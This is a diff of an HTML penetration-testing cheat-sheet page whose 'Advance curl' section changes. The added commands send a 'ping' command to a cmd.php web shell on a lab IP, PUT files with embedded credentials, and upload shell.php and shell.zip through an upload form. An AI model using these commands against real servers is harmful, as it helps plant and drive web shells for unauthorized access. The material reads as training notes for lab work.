@@ -46,15 +46,21 @@
 
 <div class="content"><hr>
 <h3 id="advance-curl">Advance curl</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># PUT request with a file</span>
-</span></span><span class="line"><span class="cl">curl -X PUT http://example.com/test.txt -d @test.txt
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Url encode POST data</span>
+</span></span><span class="line"><span class="cl">curl --data-urlencode <span class="s1">&#39;cmd=ping -c3 10.10.14.10&#39;</span> http://10.10.11.10/cmd.php
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># PUT request with a file</span>
+</span></span><span class="line"><span class="cl">curl -X PUT http://10.10.11.10/test.txt -d @test.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># PUT request with a file (with creds)</span>
+</span></span><span class="line"><span class="cl">curl -X PUT http://user:password@10.10.11.10/test.txt -d @test.txt
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Upload as binary (preserve newlines and control characters)</span>
-</span></span><span class="line"><span class="cl">curl -X PUT http://example.com/test.txt --data-binary @test.aspx
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># POST request with with form param `file`</span>
-</span></span><span class="line"><span class="cl">curl -X POST -F <span class="s2">&#34;file=@shell.php;type=application/php;filename=shell.php&#34;</span> <span class="s1">&#39;http://example.com/upload&#39;</span>
+</span></span><span class="line"><span class="cl">curl -X PUT http://10.10.11.10/test.txt --data-binary @test.aspx
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># POST request with form param `file` and attach a file</span>
+</span></span><span class="line"><span class="cl">curl -X POST -F <span class="s2">&#34;file=@shell.php;type=application/php;filename=shell.php&#34;</span> http://10.10.11.10/upload
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># POST request with form param `file` and treat the file as raw-text (Not attachment)</span>
+</span></span><span class="line"><span class="cl">curl -X POST -F <span class="s1">&#39;file=&lt;shell.zip&#39;</span> http://10.10.11.10/upload
 </span></span></code></pre></div><br></div></div>
     
-    <script src="/utils.js"></script>
+    <script src="/js/utils.js"></script>
     <footer>
     <hr>
     <div class="footer-text">
